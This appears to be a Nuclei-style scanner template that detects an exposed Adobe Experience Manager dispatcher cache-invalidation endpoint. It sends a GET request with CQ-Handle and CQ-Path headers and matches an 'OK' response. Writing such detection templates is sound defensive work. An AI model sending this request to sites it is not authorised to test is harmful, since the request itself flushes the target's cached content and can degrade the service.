id: aem-cached-pages

info:
  name: Invalidate / Flush Cached Pages on AEM
  author: HuanXiong
  severity: low

  tags: Information Disclosure

http:
  - method: GET
    path:
      - "{{BaseURL}}/dispatcher/invalidate.cache"

    headers:
      CQ-Handle: /content
      CQ-Path: /content

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "<H1>OK</H1>"

      - type: status
        status:
          - 200

